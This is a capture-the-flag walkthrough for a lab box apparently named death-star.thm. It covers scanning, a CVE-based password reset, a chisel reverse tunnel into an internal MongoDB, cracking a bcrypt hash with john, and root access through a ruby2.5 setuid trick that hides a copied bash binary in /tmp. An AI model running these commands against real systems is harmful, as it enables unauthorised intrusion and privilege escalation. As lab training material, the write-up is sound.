Step 1: Initial Enumeration

`nmap -A -p- -T4 10.10.20.103`

Conducted a comprehensive scan of the target using Nmap, which identified two open ports:
Port 22: SSH running OpenSSH 7.6p1.
Port 80: HTTP running Apache 2.4.29. The web service redirected to http://death-star.thm, suggesting further enumeration of subdomains was needed.


Step 2: Subdomain Discovery
Found a subdomain named force associated with the death-star.thm domain. This subdomain appeared to host a web application requiring login credentials.

Step 3: Exploiting the Web Application
Registered a new user account on the web application and used a known CVE to reset the vader account password.
Logged into the application as vader and accessed its backend. From there, obtained a shell as the vader user.

Step 4: Port Forwarding to Access MongoDB

`./chisel client 10.21.78.142:8000 R:8081:172.17.0.4:8081`

Discovered that MongoDB was hosted internally on 172.17.0.4:8081. Since it was inaccessible directly, configured a tool to forward the internal port, making the service accessible remotely. This setup allowed direct interaction with the database.

Step 5: Exploiting MongoDB
Used another CVE to gain a shell on the MongoDB server. While enumerating its filesystem, located a backup file containing a bcrypt-hashed password for the vader account.

Step 6: Cracking the Password

`echo 'vader:$2a$06$g10icfFeWNjZCtE3SEbm7uIgZNnw25iz4XUh94XdqQmFYofaSi8CW' > vader.hash`

`john vader.hash --wordlist=/usr/share/wordlists/rockyou.txt `

Saved the bcrypt hash to a file and used a password-cracking tool with the RockYou wordlist. After a short period, successfully cracked the password and retrieved jediknight as the credential.

Step 7: Gaining SSH Access
Used the cracked password to log into the target as the vader user.

`ssh-keygen`

Create a ssh key for vader user to connect in ssh

Explored the user’s home directory and found the user.txt flag.

Step 8: Privilege Escalation
Ran a privilege escalation script to enumerate potential weaknesses in the system. This revealed that the ruby2.5 binary had elevated permissions due to AppArmor settings.

Exploiting Ruby2.5 for Privilege Escalation:

`cd /tmp
cp /bin/bash .X0-lock
chmod +x .X0-lock
usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X0-lock /tmp/.X2-lock"'
./.X2-lock -p
`

Copied the bash binary to a temporary location and renamed it to create a malicious binary.
Adjusted permissions to make the malicious binary executable.
Used ruby2.5 to execute the malicious binary, preserving its elevated privileges.
Gained a root shell by executing the newly created binary.

Step 9: Root Access
Navigated to the root directory and located the root.txt flag. However, the exact flag content was not recorded in the notes.

